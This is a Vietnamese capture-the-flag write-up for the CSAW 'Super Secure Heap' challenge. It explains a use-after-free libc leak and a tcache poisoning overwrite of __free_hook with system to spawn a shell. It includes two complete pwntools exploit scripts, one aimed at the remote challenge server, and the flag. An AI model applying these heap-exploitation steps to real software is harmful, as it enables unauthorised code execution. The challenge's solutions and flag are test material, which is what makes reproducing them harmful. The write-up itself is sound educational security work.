# Super Secure Heap

1 chall thú vị về heap

## ida

```c 
__int64 menu()
{
  int v0; // eax
  int v2; // [rsp+8h] [rbp-8h]
  int v3; // [rsp+Ch] [rbp-4h]

  puts("Do you want to work with keys or content?");
  puts("1. Keys \n2. Content\n3. Exit");
  puts(">");
  v0 = read_int();
  v2 = v0 - 1;
  if ( v0 != 1 && v0 != 2 )
    return 1LL;
  puts("\nSelect one of the following options: ");
  puts("1. Add \n2. Delete\n3. Modify\n4. Show\n5. Exit");
  puts(">");
  v3 = read_int();
  switch ( v3 )
  {
    case 1:
      if ( v2 )
        add(&content);
      else
        add(&keys);
      break;
    case 2:
      if ( v2 )
        delete(&content, 0LL);
      else
        delete(&keys, 1LL);
      break;
    case 3:
      if ( v2 )
        set(&content, 1LL);
      else
        set(&keys, 0LL);
      break;
    case 4:
      if ( v2 )
        show(&content);
      else
        show(&keys);
      break;
    default:
      return 1LL;
  }
  return 0LL;
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  int i; // [rsp+Ch] [rbp-4h]

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  fflush(stdout);
  for ( i = 0; !i; i = menu() )
    ;
  puts("\nThank you for using Super Secure Heap (SSH). Exiting.");
  return 0;
}
```

- chall này khá lạ khi cho ta 2 option keys và content để khai thác
- như cái bài heap khác thì option 1 malloc, 2 là free, 3 là edit, 4 là show


## Exploit
- đầu tiên dùng uaf leak libc trước
- để ý 1 chút thì thấy nếu free content sẽ ko xóa ptr, còn keys thì có, nên t sẽ dùng content để leak libc

```python
# leak libc
add(2, 1280) # c0
add(2, 0x70) # c1
free(2, 0)
libc.address = show(2,0) - 0x1ecbe0
info("libc base: " + hex(libc.address))
```
- có được libc rồi sẽ overwrite __free_hook
- ban đầu mình tính dùng dbf bằng cách free lần đầu xong dùng set xóa ptr rồi free lần nữa để khai thác DBF nhưng mà không thành

![image](https://github.com/gookoosss/CTF/assets/128712571/007837dc-7508-4b5b-9a7e-ccc84639d681)


### Reason

![image](https://github.com/gookoosss/CTF/assets/128712571/97c659c2-f818-4700-995b-f7d1d6e1c7c7)


- đành chuyển hướng khai thác thôi
- nếu để ý thì thấy free keys không xóa con trỏ và set keys cũng ko phải qua hàm secure_stuff(), sử dụng keys ta hoàn toàn có thể thay đổi được các tcache đã free của content, từ đó vừa có count == 2 vừa có tcache là free_hook

![image](https://github.com/gookoosss/CTF/assets/128712571/75f28c65-9073-4885-a48c-e5d3ba6fcbd2)


```python
# free_hook
add(2, 0x70) # c2
free(2, 2)
free(2, 1)
add(1, 0x70) # k0
free(2, 1)
set_key(0, 0x30, p64(libc.sym.__free_hook))
```
- cuối cùng ta khởi tạo cho __free_hook thành system và lấy shell thôi

```python 
# get shell
add(1, 0x70) # k1
add(1, 0x70) # k2 == free_hook
set_key(2, 0x60, p64(libc.sym.system))
set_key(0, 0x60, b'/bin/sh\0')
free(1, 0)
```

![image](https://github.com/gookoosss/CTF/assets/128712571/9046ddb5-443d-419e-a7a7-10dc3924e7fe)


## script

**by wan:**

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./super_secure_heap_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe
p = process([exe.path])

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

gdb.attach(p, gdbscript = '''
b*add+116
b*delete+73
b*show+94
b*set+298
b*set+382
b*menu+272
c
''')

input()

def add(option, size ):
        sla(b">", str(option).encode())
        sla(b">", str(1).encode())
        sla(b":", str(size).encode())
def free(option,idx ):
        sla(b">", str(option).encode())
        sla(b">", str(2).encode())
        sla(b":", str(idx).encode())
def set(option,idx,key,size, payload):
        sla(b">", str(option).encode())
        sla(b">", str(3).encode())
        sla(b":", str(idx).encode())
        sla(b":", str(key).encode())
        sla(b":", str(size).encode())
        sla(b":", payload)
def set_key(idx, size, payload):
        sla(b">", str(1).encode())
        sla(b">", str(3).encode())
        sla(b":", str(idx).encode())
        sla(b":", str(size).encode())
        sla(b":", payload)
        
def show(option, idx):
        sla(b">", str(option).encode())
        sla(b">", str(4).encode())
        sla(b":", str(idx).encode())
        p.recvuntil(b'content: \n')
        return u64(p.recvuntil(b'Do', drop = True).ljust(8, b'\0'))

# leak libc
add(2, 1280) # c0
add(2, 0x70) # c1
free(2, 0)
libc.address = show(2,0) - 0x1ecbe0
info("libc base: " + hex(libc.address))

# free_hook
add(2, 0x70) # c2
free(2, 2)
free(2, 1)
add(1, 0x70) # k0
free(2, 1)
set_key(0, 0x30, p64(libc.sym.__free_hook))


add(1, 0x70) # k1
add(1, 0x70) # k2 == free_hook
set_key(2, 0x60, p64(libc.sym.system))
set_key(0, 0x60, b'/bin/sh\0')
free(1, 0)
# csawctf{_d0es_Borat_aPpr0ve_oF_tH3_n3w_SsH?}


p.interactive()

```

**by me :)) :** 

```python 
#!/usr/bin/env python3

from pwn import *

exe = ELF("./super_secure_heap_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe
p = remote('pwn.csaw.io', 9998)
# p = process([exe.path])

# gdb.attach(p, gdbscript = '''
# b*add+116
# b*delete+73
# b*show+94
# b*set+298
# b*set+382
# b*menu+272
# c
# ''')

input()

def option(idx):
    p.sendlineafter(b'>\n', idx)

def add(size):
    p.sendlineafter(b'>\n', b'2')

    p.sendlineafter(b'>\n', b'1')
    p.sendlineafter(b'item:\n', size)

def delete(idx):
    p.sendlineafter(b'>\n', b'2')

    p.sendlineafter(b'>\n', b'2')
    p.sendlineafter(b'remove:\n', idx)

def set(idx, size, data):
    p.sendlineafter(b'>\n', b'2')

    p.sendlineafter(b'>\n', b'3')
    p.sendlineafter(b'modify:\n', idx)
    p.sendlineafter(b'with:\n', b'0')
    p.sendlineafter(b'content:\n', size)
    p.sendlineafter(b'Enter the content:\n', data)

def show(idx):
    p.sendlineafter(b'>\n', b'2')

    p.sendlineafter(b'>\n', b'4')
    p.sendlineafter(b'show:\n', idx)

p.sendlineafter(b'>\n', b'1')
p.sendlineafter(b'>\n', b'1') # 0
p.sendlineafter(b'item:\n', b'1280')
p.sendlineafter(b'>\n', b'1')
p.sendlineafter(b'>\n', b'3')
p.sendlineafter(b'modify:\n', b'0')
p.sendlineafter(b'content:\n', b'800')
p.sendlineafter(b'Enter the content:\n', b'a'*0x100)


add(b'1280') # 0
add(b'80') # 1
delete(b'0')
show(b'0')
p.recvuntil(b'\n')
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - 0x1ecbe0
print(hex(libc_leak))
print(hex(libc.address))

add(b'80') # 2
delete(b'2')
delete(b'1')
p.sendlineafter(b'>\n', b'1')
p.sendlineafter(b'>\n', b'1') # 1
p.sendlineafter(b'item:\n', b'80')
delete(b'1')

free_hook = libc.sym['__free_hook'] 

p.sendlineafter(b'>\n', b'1')
p.sendlineafter(b'>\n', b'3')
p.sendlineafter(b'modify:\n', b'1') 
p.sendlineafter(b'content:\n', b'64')
p.sendlineafter(b'Enter the content:\n', p64(free_hook) + b'a' * 16)

p.sendlineafter(b'>\n', b'1')
p.sendlineafter(b'>\n', b'1') # 2
p.sendlineafter(b'item:\n', b'80')

p.sendlineafter(b'>\n', b'1')
p.sendlineafter(b'>\n', b'1') # 3
p.sendlineafter(b'item:\n', b'80')

p.sendlineafter(b'>\n', b'1')
p.sendlineafter(b'>\n', b'3')
p.sendlineafter(b'modify:\n', b'3') 
p.sendlineafter(b'content:\n', b'64')
p.sendlineafter(b'Enter the content:\n', p64(libc.sym['system']))

p.sendlineafter(b'>\n', b'1')
p.sendlineafter(b'>\n', b'3')
p.sendlineafter(b'modify:\n', b'2') 
p.sendlineafter(b'content:\n', b'64')
p.sendlineafter(b'Enter the content:\n', b'/bin/sh\0')


p.sendlineafter(b'>\n', b'1')
p.sendlineafter(b'>\n', b'2')
p.sendlineafter(b'remove:\n', b'2')

p.interactive()

# csawctf{_d0es_Borat_aPpr0ve_oF_tH3_n3w_SsH?}


```

## Flag 

csawctf{_d0es_Borat_aPpr0ve_oF_tH3_n3w_SsH?}
